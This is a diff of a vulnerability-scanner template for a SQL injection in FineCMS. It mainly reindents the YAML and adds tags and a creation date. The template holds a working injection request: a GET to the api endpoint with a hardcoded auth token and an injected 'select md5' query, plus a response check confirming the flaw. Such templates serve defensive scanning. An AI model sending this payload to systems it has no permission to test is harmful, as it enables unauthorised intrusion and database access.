@@ -1,17 +1,18 @@
 id: finecms-sqli
 
 info:
-    name: FineCMS sqli
-    author: Rexus
-    severity: high
+  name: FineCMS sqli
+  author: Rexus
+  severity: high
+  tags: finecms,sqli
+  created: 2023/11/14
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27
-        expression: response.body.bcontains(bytes(md5(string(rand))))
+  r0:
+    request:
+      method: GET
+      path: /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27
+    expression: response.body.bcontains(bytes(md5(string(rand))))
 expression: r0()
-
